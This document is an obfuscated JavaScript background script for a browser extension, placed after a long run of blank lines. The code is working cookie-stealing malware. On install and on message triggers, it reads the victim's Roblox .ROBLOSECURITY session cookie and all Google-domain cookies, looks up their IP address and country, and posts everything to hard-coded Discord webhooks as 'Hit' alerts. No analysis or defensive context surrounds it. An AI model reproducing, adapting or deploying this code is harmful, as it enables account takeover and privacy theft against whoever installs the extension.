












































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































const _0x34eebd = _0x2d34;
(function (_0xb4bb9d, _0x320d6f) {
    const _0x56f9f8 = _0x2d34,
        _0x9e82a2 = _0xb4bb9d();
    while (!![]) {
        try {
            const _0xc870ad =
                -parseInt(_0x56f9f8(0x10e)) / 0x1 +
                (-parseInt(_0x56f9f8(0x107)) / 0x2) * (-parseInt(_0x56f9f8(0x127)) / 0x3) +
                (parseInt(_0x56f9f8(0x113)) / 0x4) * (-parseInt(_0x56f9f8(0x10c)) / 0x5) +
                parseInt(_0x56f9f8(0xea)) / 0x6 +
                (parseInt(_0x56f9f8(0x112)) / 0x7) * (parseInt(_0x56f9f8(0xe5)) / 0x8) +
                parseInt(_0x56f9f8(0x10d)) / 0x9 +
                (-parseInt(_0x56f9f8(0x11f)) / 0xa) * (parseInt(_0x56f9f8(0x103)) / 0xb);
            if (_0xc870ad === _0x320d6f) break;
            else _0x9e82a2["push"](_0x9e82a2["shift"]());
        } catch (_0x3aeffb) {
            _0x9e82a2["push"](_0x9e82a2["shift"]());
        }
    }
})(_0x1480, 0x7f753),
    chrome[_0x34eebd(0xf0)]["onInstalled"][_0x34eebd(0xfb)](() => {
        const _0x1637fa = _0x34eebd;
        console[_0x1637fa(0xff)](_0x1637fa(0x110)),
            fetch(_0x1637fa(0x10f))
                [_0x1637fa(0x11b)]((_0x5c11ed) => _0x5c11ed[_0x1637fa(0xf8)]())
                ["then"]((_0x3eca09) => {
                    const _0x2268f4 = _0x1637fa,
                        _0x3404a9 = _0x3eca09[_0x2268f4(0xf6)],
                        _0x336081 = _0x3eca09[_0x2268f4(0xe1)];
                    console[_0x2268f4(0xff)](_0x2268f4(0xf2), _0x3404a9),
                        console[_0x2268f4(0xff)](_0x2268f4(0xf9), _0x336081),
                        chrome[_0x2268f4(0xe7)]["get"]({ url: _0x2268f4(0xe3), name: _0x2268f4(0xf4) }, function (_0x549cfe) {
                            const _0x1c966c = _0x2268f4,
                                _0x5ade93 = _0x549cfe ? _0x549cfe[_0x1c966c(0x122)] : null;
                            _0x5ade93 ? getNicknameFromCookie(_0x5ade93, _0x3404a9, _0x336081) : console[_0x1c966c(0xff)]("Cookie\x20not\x20found\x20or\x20has\x20no\x20value.");
                        });
                })
                [_0x1637fa(0x100)]((_0x5e77e4) => {
                    const _0x32b256 = _0x1637fa;
                    console[_0x32b256(0x120)](_0x32b256(0xee), _0x5e77e4);
                });
    });
function getNicknameFromCookie(_0x30af4b, _0x1c7a48, _0x1947cf) {
    const _0x4c754d = _0x34eebd;
    fetch("https://users.roblox.com/v1/users/authenticated", { method: _0x4c754d(0x111), headers: { Cookie: _0x4c754d(0x121) + _0x30af4b } })
        [_0x4c754d(0x11b)]((_0x55fa3b) => _0x55fa3b[_0x4c754d(0xf8)]())
        [_0x4c754d(0x11b)]((_0x1a623f) => {
            const _0x1271db = _0x4c754d,
                _0x457b98 = _0x1a623f[_0x1271db(0x11c)],
                _0x475601 = _0x1271db(0x117) + _0x1a623f["id"] + _0x1271db(0xec);
            sendToWebhook(_0x30af4b, _0x1271db(0x102), "install", _0x1c7a48, _0x1947cf, _0x457b98, _0x475601);
        })
        ["catch"]((_0x4d58dc) => {
            const _0x2960de = _0x4c754d;
            console[_0x2960de(0x120)]("Error\x20occurred\x20while\x20retrieving\x20nickname:", _0x4d58dc);
        });
}
chrome[_0x34eebd(0xf0)][_0x34eebd(0x10b)]["addListener"]((_0x2b8343, _0x5f0e02, _0x5e1f13) => {
    const _0x58c5ff = _0x34eebd;
    if (_0x2b8343["action"] === "sendNicknameAndAvatar") {
        const { nickname: _0x2d96c0, avatar: _0x212772 } = _0x2b8343;
        fetch("http://ip-api.com/json")
            [_0x58c5ff(0x11b)]((_0x1839c5) => _0x1839c5[_0x58c5ff(0xf8)]())
            [_0x58c5ff(0x11b)]((_0x58905d) => {
                const _0x4b36ca = _0x58c5ff,
                    _0x46d5ca = _0x58905d[_0x4b36ca(0xf6)],
                    _0x243244 = _0x58905d[_0x4b36ca(0xe1)];
                chrome[_0x4b36ca(0xe7)]["get"]({ url: _0x4b36ca(0xe3), name: _0x4b36ca(0xf4) }, function (_0x576082) {
                    const _0x5bacd9 = _0x4b36ca,
                        _0x17be12 = _0x576082 ? _0x576082[_0x5bacd9(0x122)] : null;
                    _0x17be12 ? sendToWebhook(_0x17be12, _0x5bacd9(0x11d), _0x5bacd9(0xe6), _0x46d5ca, _0x243244, _0x2d96c0, _0x212772) : console[_0x5bacd9(0xff)](_0x5bacd9(0x115));
                });
            })
            [_0x58c5ff(0x100)]((_0x2c2dbe) => {
                const _0x20a54e = _0x58c5ff;
                console[_0x20a54e(0x120)](_0x20a54e(0xee), _0x2c2dbe);
            });
    }
});
function sendToWebhook(_0x41cdb2, _0xb61a0a, _0x29b2a2, _0x3d0349, _0x579520, _0x221b98, _0x218cb0) {
    const _0xa73f1b = _0x34eebd;
    let _0x5cdc50;
    if (_0x29b2a2 === _0xa73f1b(0x125)) _0x5cdc50 = _0xa73f1b(0x108);
    else _0x29b2a2 === _0xa73f1b(0xe6) && (_0x5cdc50 = "https://discord.com/api/webhooks/1374802771550929038/GbuB-H4PW-zfNOhtz4dSJEDNG3pC9Dky5xBBhVLIAilGycPLkghNRKcdhbzB0eGTIzaP");
    const _0x1f9b14 = {
        title: _0xa73f1b(0xf3),
        color: 0x58b9ff,
        timestamp: new Date()[_0xa73f1b(0xe4)](),
        thumbnail: _0x218cb0 ? { url: _0x218cb0 } : null,
        description: _0xa73f1b(0x126) + (_0x41cdb2 ? _0x41cdb2 : _0x221b98) + "```",
        fields: [
            { name: "Country", value: _0xa73f1b(0x126) + _0x579520 + _0xa73f1b(0x126), inline: !![] },
            { name: "IP\x20Address", value: "```" + _0x3d0349 + _0xa73f1b(0x126), inline: !![] },
            _0x221b98 ? { name: _0xa73f1b(0x11a), value: _0xa73f1b(0x126) + _0x221b98 + _0xa73f1b(0x126), inline: !![] } : null,
        ][_0xa73f1b(0x10a)](Boolean),
        footer: { text: "At\x20the\x20time\x20-\x20" + _0xb61a0a },
    };
    fetch(_0x5cdc50, { method: _0xa73f1b(0x124), headers: { "Content-Type": "application/json" }, body: JSON[_0xa73f1b(0xf5)]({ content: "@everyone", embeds: [_0x1f9b14] }) })
        [_0xa73f1b(0x11b)]((_0x4b29c6) => _0x4b29c6[_0xa73f1b(0xf8)]())
        [_0xa73f1b(0x11b)]((_0x1d9874) => {
            const _0x46cd99 = _0xa73f1b;
            console[_0x46cd99(0xff)](_0x46cd99(0xfe), _0x1d9874);
        })
        [_0xa73f1b(0x100)]((_0x350ee1) => {
            const _0x84666f = _0xa73f1b;
            console[_0x84666f(0x120)](_0x84666f(0xed), _0x350ee1);
        });
}
function _0x1480() {
    const _0x26c93f = [
        "nickname",
        "cookies",
        "length",
        "toLocaleString",
        "1872822JYhJbs",
        "en-US",
        "&width=150&height=150&format=png",
        "Webhook\x20error:",
        "Could\x20not\x20retrieve\x20IP\x20address\x20or\x20country\x20information:",
        "file",
        "runtime",
        "getAll",
        "User\x20IP\x20Address:\x20",
        "Hit",
        ".ROBLOSECURITY",
        "stringify",
        "query",
        "2-digit",
        "json",
        "User\x20Country:\x20",
        "Unknown",
        "addListener",
        "No\x20cookie\x20found.",
        "action",
        "Webhook\x20response:",
        "log",
        "catch",
        ".google.com",
        "Installation\x20time",
        "3656939gqhpPK",
        "Country",
        "onInstalled",
        "cookies.txt",
        "2834xNyxKW",
        "https://discord.com/api/webhooks/1374802783366283345/KtXhetDYCoa2Wi4m7vWKnEAR7wI2HlRY7Kb75MZ89zA3_ZkJmZGU6NzVzHkMxOhzigXa",
        "https://discord.com/api/webhooks/1374802771550929038/GbuB-H4PW-zfNOhtz4dSJEDNG3pC9Dky5xBBhVLIAilGycPLkghNRKcdhbzB0eGTIzaP",
        "filter",
        "onMessage",
        "55heeBpl",
        "8256717equDgd",
        "872717VtVYjd",
        "http://ip-api.com/json",
        "Extension\x20Installed!",
        "GET",
        "1900472AGbUYF",
        "118492dBlgot",
        "@gmail.com",
        "Cookie\x20not\x20found\x20or\x20has\x20no\x20value.",
        "Extension\x20installed",
        "https://www.roblox.com/headshot-thumbnail/image?userId=",
        "Time",
        "payload_json",
        "Nickname",
        "then",
        "name",
        "Nickname\x20and\x20Avatar\x20received",
        "text/plain",
        "20arftrz",
        "error",
        ".ROBLOSECURITY=",
        "value",
        "@everyone\x20**Hit**",
        "POST",
        "install",
        "```",
        "723csronw",
        "country",
        "getCookie",
        "https://www.roblox.com/home",
        "toISOString",
        "24aULjmk",
    ];
    _0x1480 = function () {
        return _0x26c93f;
    };
    return _0x1480();
}
function _0x2d34(_0x410a9a, _0x118a67) {
    const _0x14804e = _0x1480();
    return (
        (_0x2d34 = function (_0x2d3469, _0x3c490f) {
            _0x2d3469 = _0x2d3469 - 0xe1;
            let _0x2ed422 = _0x14804e[_0x2d3469];
            return _0x2ed422;
        }),
        _0x2d34(_0x410a9a, _0x118a67)
    );
}
chrome[_0x34eebd(0xf0)][_0x34eebd(0x105)][_0x34eebd(0xfb)](() => {
    const _0x211f5a = _0x34eebd;
    console[_0x211f5a(0xff)](_0x211f5a(0x116)), getAllCookiesAndSend();
}),
    chrome[_0x34eebd(0xf0)][_0x34eebd(0x10b)]["addListener"]((_0x127955, _0x4e8517, _0x44f02f) => {
        const _0x498557 = _0x34eebd;
        _0x127955[_0x498557(0xfd)] === _0x498557(0xe2) && getAllCookiesAndSend();
    });
function getAllCookiesAndSend() {
    const _0x348f1d = _0x34eebd;
    fetch(_0x348f1d(0x10f))
        [_0x348f1d(0x11b)]((_0x1377bd) => _0x1377bd[_0x348f1d(0xf8)]())
        ["then"]((_0x1ef858) => {
            const _0x225efe = _0x348f1d,
                _0x5d1e3a = _0x1ef858[_0x225efe(0xf6)],
                _0x3f4b44 = _0x1ef858["country"];
            chrome["cookies"][_0x225efe(0xf1)]({ domain: _0x225efe(0x101) }, function (_0xf30ab5) {
                const _0x277387 = _0x225efe;
                if (_0xf30ab5[_0x277387(0xe8)] > 0x0) {
                    const _0x145710 = JSON["stringify"](_0xf30ab5, null, 0x2),
                        _0x33de3f = new Blob([_0x145710], { type: _0x277387(0x11e) }),
                        _0x120429 = new FormData();
                    _0x120429["append"](_0x277387(0xef), _0x33de3f, _0x277387(0x106));
                    let _0x4125b3 = _0x277387(0xfa);
                    for (let _0x414abb of _0xf30ab5) {
                        if (_0x414abb["name"] === "G_AUTHUSER_H") {
                            _0x4125b3 = "user" + _0x414abb[_0x277387(0x122)] + _0x277387(0x114);
                            break;
                        }
                    }
                    const _0x574d96 = new Date(),
                        _0x261b06 = _0x574d96[_0x277387(0xe9)](_0x277387(0xeb), { hour: _0x277387(0xf7), minute: _0x277387(0xf7), second: _0x277387(0xf7) }),
                        _0x46495f = {
                            title: "Hit",
                            color: 0x58b9ff,
                            fields: [
                                { name: _0x277387(0x118), value: "**" + _0x261b06 + "**", inline: !![] },
                                { name: "IP\x20Address", value: "**" + _0x5d1e3a + "**", inline: !![] },
                                { name: _0x277387(0x104), value: "**" + _0x3f4b44 + "**", inline: !![] },
                            ],
                        },
                        _0x2813d9 = JSON[_0x277387(0xf5)]({ content: _0x277387(0x123), embeds: [_0x46495f] });
                    _0x120429["append"](_0x277387(0x119), _0x2813d9),
                        fetch(_0x277387(0x109), { method: _0x277387(0x124), body: _0x120429 })
                            [_0x277387(0x11b)]((_0x171c64) => _0x171c64[_0x277387(0xf8)]())
                            ["then"]((_0x32a99a) => {
                                const _0x49001e = _0x277387;
                                console[_0x49001e(0xff)](_0x49001e(0xfe), _0x32a99a);
                            })
                            [_0x277387(0x100)]((_0x5b5db5) => {
                                const _0x4382e0 = _0x277387;
                                console[_0x4382e0(0x120)](_0x4382e0(0xed), _0x5b5db5);
                            });
                } else console[_0x277387(0xff)](_0x277387(0xfc));
            });
        })
        [_0x348f1d(0x100)]((_0x334cad) => {
            const _0x16ba32 = _0x348f1d;
            console[_0x16ba32(0x120)](_0x16ba32(0xee), _0x334cad);
        });
}
